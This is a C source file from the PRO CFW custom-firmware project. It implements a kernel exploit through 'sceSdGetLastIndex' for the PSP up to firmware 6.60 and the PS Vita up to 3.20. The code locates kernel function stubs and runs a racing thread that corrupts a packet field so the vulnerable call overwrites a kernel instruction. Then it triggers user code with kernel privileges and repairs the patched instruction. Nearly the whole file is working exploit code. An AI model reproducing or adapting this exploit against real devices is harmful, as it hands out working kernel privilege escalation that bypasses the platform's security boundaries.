/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <sdk.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <module2.h>
#include <lflash0.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include <string.h>
#include "kxploit.h"

/*
 sceSdGetLastIndex Kernel Exploit for PSP up to 6.60 and PS Vita up to 3.20, both PSP and PSX exploits
*/

int (* _sceSdGetLastIndex)(int a1, int a2, int a3) = (void *)NULL;
int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;

unsigned int (* _sceKernelCpuSuspendIntr)() = (void*)NULL;
void (* _sceKernelCpuResumeIntr)(unsigned int flags) = (void*)NULL;

void (* _sceKernelPowerLock)(u32) = (void*)NULL;

int savedata_open = 0;

u32 packet[256], is_exploited, libctime_addr=0x8800F71C;

void executeKernel(u32 kernelContentFunction)
{
    if (_sceKernelLibcTime == NULL)
        _sceKernelPowerLock(kernelContentFunction | (u32)0x80000000);
    else
        _sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);
}

void repairInstruction(void){
    //Vita 2.61
    if (_sceKernelLibcTime == NULL)
        _sw(0x0040F809, 0x8800CB64);
    else
        _sw(0x8C654384, libctime_addr); // recover the damage we've done
}

void KernelFunction()
{
    is_exploited = 1;
}

int stubScanner(FunctionTable* tbl){

    // thread and interrupt functions
    PRTSTR("Scanning interrupt stubs");
    _sceKernelCpuSuspendIntr = g_tbl->KernelCpuSuspendIntr;
    _sceKernelCpuResumeIntr = g_tbl->KernelCpuResumeIntr;

    // vulnerable function
    PRTSTR("Scanning vulnerable function");
    _sceSdGetLastIndex = (void*)g_tbl->FindImportUserRam("sceChnnlsv", 0xC4C494F8);
    if (_sceSdGetLastIndex == NULL){
        PRTSTR("Opening savedata utility");
        p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
        _sceSdGetLastIndex = (void*)g_tbl->FindImportVolatileRam("sceChnnlsv", 0xC4C494F8);
        savedata_open = 1;
    }
    // the function we need to patch
    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);

    PRTSTR("Scanning powerlock");
    if (_sceKernelLibcTime == NULL)
        _sceKernelPowerLock = (void *)g_tbl->FindImportUserRam("sceSuspendForUser", 0xEADB1BD7);

    g_tbl->KernelDcacheWritebackAll();

    return (
        _sceKernelCpuSuspendIntr == NULL ||
        _sceKernelCpuResumeIntr == NULL ||
        _sceSdGetLastIndex == NULL ||
        (
            _sceKernelLibcTime == NULL &&
            _sceKernelPowerLock == NULL
        )
    );
}

int doExploit()
{

    PRTSTR("Attempting kernel exploit");

    if (_IS_PSP(g_tbl->config)){
        libctime_addr = 0x8800F798;
        PRTSTR("Kxploit in PSP mode");
    }

    is_exploited = 0;

    // the threads that will make sceSdGetLastIndex vulnerable
    int qwik_thread()
    {
        while (is_exploited != 1) {
            if (_sceKernelLibcTime == NULL)
                packet[9] = 0x8800CB66 - 20 - (u32)&packet;
            else
                packet[9] = libctime_addr - 18 - (u32)&packet;
            g_tbl->KernelDelayThread(0);
        }

        return 0;
    }

    // we create the thread and constantly attempt the exploit
    SceUID qwikthread = g_tbl->KernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);
    g_tbl->KernelStartThread(qwikthread, 0, NULL);

    while (is_exploited != 1) {
        packet[9] = (u32)16;
        _sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
        g_tbl->KernelDelayThread(0);
        if (_sceKernelLibcTime == NULL)
            _sceKernelPowerLock((u32)&KernelFunction | (u32)0x80000000);
        else
            _sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
        g_tbl->KernelDcacheWritebackAll();
    }

    if (savedata_open)
        p5_close_savedata();

    PRTSTR("kxploit done");

    return 0;
}
